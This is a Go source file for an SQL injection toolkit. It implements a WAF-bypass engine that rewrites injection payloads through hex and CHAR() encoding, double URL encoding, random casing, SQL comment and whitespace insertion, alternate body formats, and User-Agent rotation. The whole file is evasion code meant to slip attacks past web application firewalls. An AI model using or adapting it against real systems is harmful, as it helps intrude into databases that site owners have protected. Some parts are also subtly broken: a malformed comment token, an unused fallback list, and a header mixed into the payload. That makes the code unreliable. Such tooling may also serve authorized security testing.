package sqli

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
)

type WBypassEngine struct {
	techniques []WAFBypass
	fallback   []WAFBypass
}

func NewWAFBypassEngine() *WBypassEngine {
	engine := &WBypassEngine{
		techniques: make([]WAFBypass, 0),
		fallback:   make([]WAFBypass, 0),
	}
	engine.RegisterDefaultTechniques()
	return engine
}

func (w *WBypassEngine) Register(bypass WAFBypass) {
	w.techniques = append(w.techniques, bypass)
}

func (w *WBypassEngine) RegisterDefaultTechniques() {
	w.Register(&HexEncodingBypass{})
	w.Register(&CharFunctionBypass{})
	w.Register(&UnicodeEncodingBypass{})
	w.Register(&DoubleURLEncodingBypass{})
	w.Register(&CaseVariationBypass{})
	w.Register(&CommentInsertionBypass{})
	w.Register(&WhitespaceVariantsBypass{})
	w.Register(&JSONBodyBypass{})
	w.Register(&GraphQLParamBypass{})
	w.Register(&XMLParamBypass{})
	w.Register(&MultipartFormBypass{})
	w.Register(&UARotationBypass{})
}

func (w *WBypassEngine) Bypass(payload string) string {
	if len(w.techniques) == 0 {
		return payload
	}
	idx := rand.Intn(len(w.techniques))
	return w.techniques[idx].Bypass(payload)
}

func (w *WBypassEngine) BypassAll(payload string) []string {
	results := make([]string, 0, len(w.techniques))
	seen := make(map[string]bool)
	for _, t := range w.techniques {
		bypassed := t.Bypass(payload)
		if !seen[bypassed] {
			seen[bypassed] = true
			results = append(results, bypassed)
		}
	}
	return results
}

func (w *WBypassEngine) FallbackBypass(payload string) string {
	bypassed := w.Bypass(payload)
	if bypassed != payload {
		return bypassed
	}
	for _, t := range w.fallback {
		bypassed = t.Bypass(payload)
		if bypassed != payload {
			return bypassed
		}
	}
	return payload
}

type HexEncodingBypass struct{}

func (h *HexEncodingBypass) Name() string { return "hex_encoding" }

func (h *HexEncodingBypass) Bypass(payload string) string {
	if len(payload) == 0 {
		return payload
	}
	var sb strings.Builder
	for _, b := range []byte(payload) {
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	return sb.String()
}

type CharFunctionBypass struct{}

func (c *CharFunctionBypass) Name() string { return "char_function" }

func (c *CharFunctionBypass) Bypass(payload string) string {
	if len(payload) == 0 {
		return payload
	}
	chars := make([]string, len(payload))
	for i, b := range []byte(payload) {
		chars[i] = fmt.Sprintf("%d", b)
	}
	return "CHAR(" + strings.Join(chars, ",") + ")"
}

type UnicodeEncodingBypass struct{}

func (u *UnicodeEncodingBypass) Name() string { return "unicode_encoding" }

func (u *UnicodeEncodingBypass) Bypass(payload string) string {
	var sb strings.Builder
	for _, r := range payload {
		if r < 128 {
			sb.WriteString(fmt.Sprintf("%%%02x", r))
		} else {
			sb.WriteString(fmt.Sprintf("\\u%04x", r))
		}
	}
	return sb.String()
}

type DoubleURLEncodingBypass struct{}

func (d *DoubleURLEncodingBypass) Name() string { return "double_url_encoding" }

func (d *DoubleURLEncodingBypass) Bypass(payload string) string {
	encoded := url.QueryEscape(payload)
	return url.QueryEscape(encoded)
}

type CaseVariationBypass struct{}

func (c *CaseVariationBypass) Name() string { return "case_variation" }

func (c *CaseVariationBypass) Bypass(payload string) string {
	result := make([]byte, len(payload))
	for i, b := range []byte(payload) {
		if rand.Intn(2) == 0 {
			if b >= 'a' && b <= 'z' {
				result[i] = b - 32
			} else {
				result[i] = b
			}
		} else {
			if b >= 'A' && b <= 'Z' {
				result[i] = b + 32
			} else {
				result[i] = b
			}
		}
	}
	return string(result)
}

type CommentInsertionBypass struct{}

func (c *CommentInsertionBypass) Name() string { return "comment_insertion" }

func (c *CommentInsertionBypass) Bypass(payload string) string {
	comments := []string{"/**/", "/!*/", "/**/"}
	words := strings.Fields(payload)
	if len(words) == 0 {
		return payload
	}
	result := words[0]
	for _, word := range words[1:] {
		comment := comments[rand.Intn(len(comments))]
		result += comment + word
	}
	return result
}

type WhitespaceVariantsBypass struct{}

func (w *WhitespaceVariantsBypass) Name() string { return "whitespace_variants" }

func (w *WhitespaceVariantsBypass) Bypass(payload string) string {
	whitespace := []string{"%20", "%09", "%0a", "%0d", "%0c", "/**/"}
	words := strings.Fields(payload)
	if len(words) == 0 {
		return payload
	}
	result := words[0]
	for _, word := range words[1:] {
		ws := whitespace[rand.Intn(len(whitespace))]
		result += ws + word
	}
	return result
}

type JSONBodyBypass struct{}

func (j *JSONBodyBypass) Name() string { return "json_body" }

func (j *JSONBodyBypass) Bypass(payload string) string {
	key := fmt.Sprintf("param_%d", rand.Intn(10000))
	return fmt.Sprintf(`{"%s":"%s"}`, key, payload)
}

type GraphQLParamBypass struct{}

func (g *GraphQLParamBypass) Name() string { return "graphql_param" }

func (g *GraphQLParamBypass) Bypass(payload string) string {
	return fmt.Sprintf(`{"query":"query{user(id:\"%s\"){name}}","variables":{}}`, payload)
}

type XMLParamBypass struct{}

func (x *XMLParamBypass) Name() string { return "xml_param" }

func (x *XMLParamBypass) Bypass(payload string) string {
	return fmt.Sprintf(`<?xml version="1.0"?><data><param>%s</param></data>`, payload)
}

type MultipartFormBypass struct{}

func (m *MultipartFormBypass) Name() string { return "multipart_form" }

func (m *MultipartFormBypass) Bypass(payload string) string {
	return fmt.Sprintf("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"field\"\r\n\r\n%s\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--", payload)
}

type UARotationBypass struct{}

func (u *UARotationBypass) Name() string { return "ua_rotation" }

func (u *UARotationBypass) Bypass(payload string) string {
	ua := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	}
	selected := ua[rand.Intn(len(ua))]
	return fmt.Sprintf("User-Agent: %s\n%s", selected, payload)
}

func (w *WBypassEngine) GetTechniqueNames() []string {
	names := make([]string, len(w.techniques))
	for i, t := range w.techniques {
		names[i] = t.Name()
	}
	return names
}

func (w *WBypassEngine) Count() int {
	return len(w.techniques)
}
